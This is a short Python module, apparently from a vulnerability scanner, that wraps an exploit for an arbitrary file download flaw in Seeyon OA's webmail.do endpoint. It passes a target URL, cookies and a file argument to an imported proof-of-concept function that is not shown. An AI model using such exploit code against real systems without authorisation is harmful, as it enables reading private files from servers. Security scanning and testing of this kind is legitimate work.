# -*- coding:utf-8 -*-
# 致远OA_webmail.do任意文件下载
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .seeyon_webmail_poc import POC
from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return poc.webmail_download(self.vuln.url, cmd, "exp")